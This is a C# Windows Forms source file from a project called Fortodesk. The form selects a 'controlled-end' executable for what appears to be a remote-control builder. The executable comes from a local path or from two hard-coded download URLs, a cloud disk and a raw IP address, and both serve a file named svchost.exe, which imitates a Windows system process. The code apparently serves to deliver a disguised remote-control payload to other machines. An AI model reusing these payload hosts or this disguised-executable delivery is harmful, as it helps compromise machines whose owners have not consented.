using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Fortodesk
{
    public partial class FullStartupForm : Form
    {


        public string ResultInput { get; private set; }

        private bool _suppressSync = false;  // ★ 新增标志位

        private static readonly string[] BuiltinUrls = new[]
        {
        "https://1814652220.cdn.123clouddisk.com/1814652220/wenjian5/svchost.exe",
        "http://103.52.153.5:5244/d/%E6%88%91%E7%9A%84%E8%93%9D%E5%A5%8F%E4%BA%91%E4%BC%98%E4%BA%AB%E7%89%88%E4%BA%91%E7%9B%98/wenjian/svchost.exe"
    };

        public FullStartupForm()
        {
            InitializeComponent();

            comboBox1.Items.AddRange(BuiltinUrls);
            comboBox1.SelectedIndex = 0;

            comboBox1.SelectedIndexChanged += (s, e) =>
            {
                if (_suppressSync) return;  // ★ 被压制时不同步
                textBox1.Text = comboBox1.SelectedItem?.ToString() ?? "";
            };

            textBox1.Text = comboBox1.SelectedItem?.ToString() ?? "";
        }

        private void button2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Filter = "可执行文件|*.exe|所有文件|*.*";
                dlg.Title = "选择被控端exe文件";
                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    _suppressSync = true;          // ★ 压制同步
                    comboBox1.SelectedIndex = -1;
                    _suppressSync = false;         // ★ 恢复同步
                    textBox1.Text = dlg.FileName;  // ★ 最后再填，不会被覆盖
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string input = textBox1.Text.Trim();
            if (string.IsNullOrWhiteSpace(input))
            {
                MessageBox.Show("请输入下载地址或选择本地文件。",
                    "提示", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            bool isUrl = input.StartsWith("http://", StringComparison.OrdinalIgnoreCase)
                      || input.StartsWith("https://", StringComparison.OrdinalIgnoreCase);
            if (!isUrl && !File.Exists(input))
            {
                MessageBox.Show($"本地文件不存在：\n{input}",
                    "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            ResultInput = input;
            this.DialogResult = DialogResult.OK;
            this.Close();
        }
    }
}
